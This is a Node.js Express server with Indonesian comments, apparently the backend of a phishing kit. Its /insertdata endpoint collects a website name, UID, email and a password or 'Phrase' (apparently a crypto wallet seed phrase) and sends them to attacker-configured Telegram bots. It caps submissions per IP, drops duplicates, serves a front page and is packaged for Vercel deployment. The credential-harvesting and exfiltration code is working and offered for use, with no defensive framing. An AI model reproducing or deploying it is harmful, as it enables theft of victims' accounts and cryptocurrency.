const express = require('express');
const cors = require('cors');
const axios = require('axios');
const crypto = require('crypto');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

// ===============================
// Batasan: Maks 2 kali per IP
// ===============================
const ipRequestCounts = new Map();
const MAX_REQUESTS_PER_IP = 2;

function ipLimiter(req, res, next) {
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const count = ipRequestCounts.get(ip) || 0;

  if (count >= MAX_REQUESTS_PER_IP) {
    return res.status(429).json({ error: 'Batas 2 data per IP telah tercapai.' });
  }

  ipRequestCounts.set(ip, count + 1);
  next();
}

// ===============================
// Cegah duplikat hash
// ===============================
const recentHashes = new Map();
const EXPIRY_TIME_MS = 30 * 1000;
// isi token bot dan id telegram di bawah ini
const telegramBots = [
  {
    name: "Bot",
    token: "XXXX",
    chatId: "XXXXX"
  },
  {
    name: "Bot",
    token: "XXXXX",
    chatId: "XXXXX"
  }
];


async function sendTelegramNotification(bot, message) {
  if (!bot.token || !bot.chatId) return;
  const url = `https://api.telegram.org/bot${bot.token}/sendMessage`;

  try {
    await axios.post(url, {
      chat_id: bot.chatId,
      text: message,
      parse_mode: 'Markdown'
    });
    console.log(`✅ Terkirim ke ${bot.name}`);
  } catch (err) {
    console.error(`❌ Gagal ke ${bot.name}:`, err.response?.data || err.message);
  }
}

app.post('/insertdata', ipLimiter, async (req, res) => {
  try {
    const { uid, websiteName, email, password } = req.body;
    if (!password) return res.status(400).json({ error: 'Password diperlukan.' });

    const hash = crypto.createHash('sha256').update(`${uid || 'none'}-${password}`).digest('hex');
    if (recentHashes.has(hash)) {
      return res.status(429).json({ error: 'Data duplikat terdeteksi.' });
    }

    recentHashes.set(hash, Date.now());
    setTimeout(() => recentHashes.delete(hash), EXPIRY_TIME_MS);

    const message = `
*⚠️ Data Diterima*

*Website:* \`${websiteName || 'N/A'}\`
*UID:* \`${uid || 'N/A'}\`
*Email:* \`${email || 'N/A'}\`
*Phrase:*
\`\`\`
${password}
\`\`\`
`;

    await Promise.all(telegramBots.map(bot => sendTelegramNotification(bot, message)));
    res.status(200).json({ message: 'Data dikirim ke semua bot.' });

  } catch (err) {
    console.error('❌ Internal error:', err);
    res.status(500).json({ error: 'Internal Server Error', detail: err.message });
  }
});

// ===============================
// Sajikan index.html
// ===============================
app.get('/', (req, res) => {
  const filePath = path.join(__dirname, '../index.html');
  res.sendFile(filePath);
});

// ===============================
// Vercel export
// ===============================
module.exports = app;

// Jalankan lokal
if (require.main === module) {
  const PORT = process.env.PORT || 3000;
  app.listen(PORT, () => {
    console.log(`🚀 Server aktif di http://localhost:${PORT}`);
  });
}
